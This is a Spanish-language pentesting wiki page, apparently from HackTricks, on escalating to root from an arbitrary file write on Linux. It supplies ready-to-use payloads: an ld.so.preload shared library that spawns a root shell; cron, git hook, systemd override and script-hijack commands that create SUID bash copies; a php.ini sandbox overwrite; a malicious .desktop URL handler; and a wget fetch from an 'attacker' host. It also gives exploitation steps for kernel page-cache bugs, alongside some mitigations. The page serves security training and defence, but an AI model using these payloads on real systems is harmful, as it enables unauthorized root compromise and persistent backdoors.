# Escritura arbitraria de archivos como root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

Este archivo se comporta como la variable de entorno **`LD_PRELOAD`**, pero también funciona en **binarios SUID**.\
Si puedes crearlo o modificarlo, simplemente puedes añadir una **ruta a una library que se cargará** con cada binario ejecutado.

Por ejemplo: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) son **scripts** que se **ejecutan** en varios **eventos** de un repositorio git, como cuando se crea un commit, se realiza un merge... Por lo tanto, si un **script o usuario privilegiado** realiza estas acciones frecuentemente y es posible **escribir en la carpeta `.git`**, esto puede usarse para realizar **privesc**.

Por ejemplo, es posible **generar un script** en un repositorio git dentro de **`.git/hooks`** para que siempre se ejecute cuando se crea un nuevo commit:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Archivos de Cron y temporizadores

Si puedes **escribir archivos relacionados con Cron que root ejecute**, normalmente puedes obtener ejecución de código la próxima vez que se ejecute el trabajo. Los objetivos interesantes incluyen:

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- El propio crontab de root en `/var/spool/cron/` o `/var/spool/cron/crontabs/`
- Temporizadores de `systemd` y los servicios que activan

Comprobaciones rápidas:
```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```
Rutas típicas de abuso:

- **Añadir un nuevo trabajo cron de root** a `/etc/crontab` o a un archivo en `/etc/cron.d/`
- **Reemplazar un script** que `run-parts` ya ejecuta
- **Crear una puerta trasera en un destino de timer existente** modificando el script o binario que lanza

Ejemplo mínimo de payload de cron:
```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```
Si solo puedes escribir dentro de un directorio de cron utilizado por `run-parts`, deja allí un archivo ejecutable en su lugar:
```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```
Notas:

- `run-parts` normalmente ignora los nombres de archivo que contienen puntos, así que es preferible usar nombres como `backup` en lugar de `backup.sh`.
- Algunas distros usan `anacron` o timers de `systemd` en lugar del cron clásico, pero la idea del abuso es la misma: **modificar lo que root ejecutará más tarde**.

### Archivos de Service y Socket

Si puedes escribir **archivos de unidad de `systemd`** o archivos referenciados por estos, es posible que puedas obtener ejecución de código como root recargando y reiniciando la unidad, o esperando a que se active la ruta de activación del service/socket.

Entre los objetivos interesantes se incluyen:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- Overrides drop-in en `/etc/systemd/system/<unit>.d/*.conf`
- Scripts/binarios de service referenciados por `ExecStart=`, `ExecStartPre=`, `ExecStartPost=`
- Rutas `EnvironmentFile=` modificables cargadas por un service root

Comprobaciones rápidas:
```bash
ls -la /etc/systemd/system /lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system 2>/dev/null
```
Rutas de abuso comunes:

- **Sobrescribir `ExecStart=`** en una unidad de servicio propiedad de root que puedas modificar
- **Añadir un drop-in override** con un `ExecStart=` malicioso y borrar primero el anterior
- **Crear un backdoor en el script/binario** al que ya hace referencia la unidad
- **Secuestrar un servicio activado por socket** modificando el archivo `.service` correspondiente que se inicia cuando el socket recibe una conexión

Ejemplo de override malicioso:
```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```
Flujo de activación típico:
```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```
Si no puedes reiniciar servicios por tu cuenta, pero puedes editar una unidad activada por `socket`, quizá solo tengas que **esperar una conexión de cliente** para activar la ejecución del servicio con backdoor como root.

### Sobrescribir un `php.ini` restrictivo utilizado por un sandbox de PHP privilegiado

Algunos daemons personalizados validan el PHP proporcionado por el usuario ejecutando `php` con un **`php.ini` restrictivo** (por ejemplo, `disable_functions=exec,system,...`). Si el código en el sandbox todavía tiene **cualquier primitive de escritura** (como `file_put_contents`) y puedes acceder a la **ruta exacta de `php.ini`** utilizada por el daemon, puedes **sobrescribir esa configuración** para eliminar las restricciones y después enviar un segundo payload que se ejecute con privilegios elevados.<sup>[[2]](#references)</sup>

Flujo habitual:

1. El primer payload sobrescribe la configuración del sandbox.
2. El segundo payload ejecuta el código ahora que las funciones peligrosas están habilitadas de nuevo.

Ejemplo mínimo (sustituye la ruta utilizada por el daemon):
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
Si el daemon se ejecuta como root (o valida usando paths propiedad de root), la segunda ejecución obtiene un contexto root. Esto es esencialmente una **escalada de privilegios mediante la sobrescritura de la configuración** cuando el runtime aislado aún puede escribir archivos.

### binfmt_misc

El archivo ubicado en `/proc/sys/fs/binfmt_misc` indica qué binario debe ejecutar qué tipo de archivos. TODO: comprobar los requisitos para abusar de esto y ejecutar una rev shell cuando se abra un tipo de archivo común.

### Sobrescribir manejadores de esquemas (como http: o https:)

Un atacante con permisos de escritura en los directorios de configuración de una víctima puede reemplazar o crear fácilmente archivos que cambien el comportamiento del sistema, lo que puede provocar una ejecución de código no intencionada. Al modificar el archivo `$HOME/.config/mimeapps.list` para apuntar los manejadores de URL HTTP y HTTPS a un archivo malicioso (por ejemplo, estableciendo `x-scheme-handler/http=evil.desktop`), el atacante garantiza que **al hacer clic en cualquier enlace http o https se ejecute el código especificado en ese archivo `evil.desktop`**. Por ejemplo, después de colocar el siguiente código malicioso en `evil.desktop`, dentro de `$HOME/.local/share/applications`, cualquier clic en una URL externa ejecutará el comando incluido:
```bash
[Desktop Entry]
Exec=sh -c 'zenity --info --title="$(uname -n)" --text="$(id)"'
Type=Application
Name=Evil Desktop Entry
```
Para obtener más información, consulta [**esta publicación**](https://chatgpt.com/c/67fac01f-0214-8006-9db3-19c40e45ee49), donde se utilizó para explotar una vulnerabilidad real.

### Root ejecutando scripts/binaries modificables por el usuario

Si un flujo de trabajo privilegiado ejecuta algo como `/bin/sh /home/username/.../script` (o cualquier binary dentro de un directorio propiedad de un usuario sin privilegios), puedes secuestrarlo:<sup>[[1]](#references)</sup>

- **Detecta la ejecución:** monitoriza los procesos con [pspy](https://github.com/DominicBreuker/pspy) para detectar a root invocando rutas controladas por el usuario:
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Confirma la capacidad de escritura:** asegúrate de que tanto el archivo objetivo como su directorio sean propiedad de tu usuario o tengan permisos de escritura para él.
- **Hijack del objetivo:** realiza una copia de seguridad del binario/script original y coloca un payload que cree una shell SUID (o cualquier otra acción de root); después, restaura los permisos:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **Activa la acción privilegiada** (por ejemplo, pulsando un botón de la UI que genere el helper). Cuando root vuelva a ejecutar la ruta secuestrada, obtén el shell con privilegios mediante `./rootshell -p`.

### Modificación únicamente de la page cache de archivos binarios privilegiados

Algunos bugs del kernel no modifican el archivo **en disco**. En su lugar, permiten modificar únicamente la copia en la **page cache** de un archivo legible. Si puedes apuntar a un binario **setuid** o ejecutado de otro modo por **root**, la siguiente ejecución puede ejecutar bytes controlados por el atacante desde la memoria y escalar privilegios, aunque el hash del archivo en disco no haya cambiado.

Esto resulta útil para pensar en ello como una **primitive de escritura de archivos solo en runtime**:

- **El disco permanece limpio**: el inode y los bytes en disco no cambian
- **La memoria queda modificada**: los procesos que leen o ejecutan la página en caché obtienen el contenido modificado por el atacante
- **El efecto es temporal**: el cambio desaparece después de reiniciar o de expulsar la página de la caché

Esta primitive se sitúa entre la **arbitrary file write** clásica y bugs antiguos de abuso de la **page cache**, como Dirty COW / Dirty Pipe:

- Dirty COW dependía de una race condition
- Dirty Pipe tenía restricciones sobre la posición de escritura
- Una primitive que solo afecte a la page cache puede ser más fiable si la ruta vulnerable permite escrituras directas en páginas cacheadas respaldadas por archivos

#### Flujo genérico de privesc

1. Obtener una primitive del kernel que pueda escribir en **páginas de la page cache respaldadas por archivos**
2. Usarla contra un **binario privilegiado legible** u otro archivo ejecutado por root
3. Activar la ejecución **antes** de que la página sea expulsada de la caché
4. Obtener ejecución de código como root mientras el archivo en disco sigue pareciendo no modificado

Objetivos típicos de alto valor:

- Binarios **setuid-root**
- Helpers iniciados por **servicios root**
- Binarios ejecutados habitualmente desde **containers que comparten el kernel/page cache del host**

#### Ruta de ejemplo con AF_ALG + `splice()`

Copy Fail (CVE-2026-31431) es un buen ejemplo de esta clase. La ruta vulnerable estaba en la API de usuarios de criptografía de Linux (`AF_ALG` / `algif_aead`):<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

- `splice()` puede mover referencias a páginas de la page cache desde un archivo legible hacia la scatterlist TX de criptografía
- la ruta de descifrado in-place de `algif_aead` reutilizaba los buffers de origen y destino
- `authencesn` escribía entonces en la región de tags de destino
- cuando esa región aún hacía referencia a páginas respaldadas por archivos mediante `splice`, la escritura terminaba en la **page cache del archivo objetivo**

Por tanto, la técnica interesante no es el propio CVE, sino el patrón:

- **introducir páginas de la caché respaldadas por archivos en un subsistema del kernel**
- hacer que el subsistema las **trate como una salida escribible**
- activar una sobrescritura pequeña y controlada en memoria

El PoC público utilizaba escrituras repetidas de **4 bytes** para parchear `/usr/bin/su` en memoria y después ejecutarlo.

#### Ruta de ejemplo con ESP / XFRM + clonación TEE de netfilter

DirtyClone (CVE-2026-43503) muestra otra variante del mismo patrón de **page-cache-only write-to-root**, pero esta vez el sink es el **descifrado IPsec ESP** en lugar de `AF_ALG`.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

La técnica importante es el paso de **metadata-laundering**:

- `splice()` coloca una **página de la page cache respaldada por un archivo y de solo lectura** en un paquete ESP-in-UDP
- la mitigación original de DirtyFrag etiquetaba ese skb con `SKBFL_SHARED_FRAG` para que `esp_input()` hiciera una **copia antes de descifrar**
- netfilter `TEE` duplica el paquete mediante `nf_dup_ipv4()` -> `__pskb_copy_fclone()`
- el clon conserva la **misma referencia física a la página de la page cache**, pero pierde `SKBFL_SHARED_FRAG`
- `esp_input()` considera entonces que el clon es seguro y ejecuta el descifrado **in-place de `cbc(aes)`** sobre la página respaldada por el archivo

Por tanto, la lección para el reviewer es más amplia que el CVE: si una mitigación depende de la **metadata del skb/página** para decidir si una operación debe hacer una copia primero, cualquier **ruta de clonación/copia que conserve la página subyacente pero elimine la metadata** puede volver a abrir silenciosamente la primitive de escritura.

Flujo de explotación típico:

1. `unshare(CLONE_NEWUSER | CLONE_NEWNET)` para obtener **`CAP_NET_ADMIN` dentro de un network namespace privado**
2. activar loopback e instalar una regla **`TEE` de netfilter** en `mangle/OUTPUT`
3. instalar SAs de transporte **XFRM ESP** mediante `NETLINK_XFRM`
4. codificar cada word objetivo de 4 bytes en el campo `seq_hi` de la SA (la técnica de selección de words de DirtyFrag)
5. enviar el paquete ESP-in-UDP obtenido mediante `splice` para que el **clon de `TEE`** llegue a `esp_input()` y descifre **in-place**
6. repetir hasta que la copia en la page cache de `/usr/bin/su` u otro ejecutable privilegiado contenga código controlado por el atacante

A nivel operativo, el impacto es el mismo que en el ejemplo con `AF_ALG`: el archivo en disco permanece limpio, pero `execve()` consume los **bytes modificados de la page cache** y proporciona root.

Comprobaciones útiles de exposición para esta variante:
```bash
unshare -Urn true 2>/dev/null && echo "user+net namespaces available"
sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null
modprobe -n -v xt_TEE 2>/dev/null
modprobe -n -v esp4 2>/dev/null
modprobe -n -v esp6 2>/dev/null
lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
```
La reducción de la superficie de ataque a corto plazo también es específica de la ruta aquí: actualizar a un kernel que incluya `48f6a5356a33` corrige la ruta de clonación, mientras que bloquear la carga automática de `xt_TEE` elimina el **flag-laundering step** y bloquear `esp4` / `esp6` elimina el **decrypt sink**.

#### Exposición y hunting

Si sospechas de esta clase de bug, no te bases únicamente en las comprobaciones de integridad del disco. Verifica también:
```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```
- `CONFIG_CRYPTO_USER_API_AEAD=m`: `algif_aead` puede cargarse o descargarse como módulo
- `CONFIG_CRYPTO_USER_API_AEAD=y`: la interfaz está integrada en el kernel
- los binarios setuid son buenos objetivos porque un parche que solo afecte a la caché de páginas puede ser suficiente para convertir un acceso local inicial en root

#### Reducción de la superficie de ataque para la ruta `algif_aead`

Si la interfaz vulnerable la proporciona un módulo cargable:
```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```
Si está compilado en el kernel, se han reportado algunas disclosures que bloquean la ruta de init con:
```bash
initcall_blacklist=algif_aead_init
```
Este tipo de mitigación también merece recordarse para otros kernel LPEs: si la explotación depende de una interfaz opcional específica, deshabilitar o incluir dicha interfaz en la blacklist puede interrumpir la ruta de explotación incluso antes de que esté disponible una actualización completa del kernel.

## Referencias

- [1] [HTB Bamboo: secuestro de un script ejecutado por root en un directorio de PaperCut escribible por el usuario](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [2] [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [3] [Tenable: FAQ de Copy Fail (CVE-2026-31431)](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [4] [Divulgación de Openwall oss-security para CVE-2026-31431](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [5] [Corrección de Linux stable: crypto: algif_aead - Revert to operating out-of-place](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [6] [Copy Fail: advisory de CVE-2026-31431](https://copy.fail/)
- [7] [Theori / Xint: análisis técnico](https://xint.io/blog/copy-fail-linux-distributions)
- [8] [Repositorio / README de DirtyClone](https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone)
- [9] [JFrog: análisis y explotación de la variante de Linux LPE DirtyClone (CVE-2026-43503)](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
- [10] [Corrección de Linux: net: skb: preservar `SKBFL_SHARED_FRAG` en `__pskb_copy_fclone()` (`48f6a5356a33`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33)
- [11] [Mitigación anterior de Linux: establecer `SKBFL_SHARED_FRAG` para paquetes UDP divididos (`f4c50a4034e6`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)

{{#include ../../banners/hacktricks-training.md}}
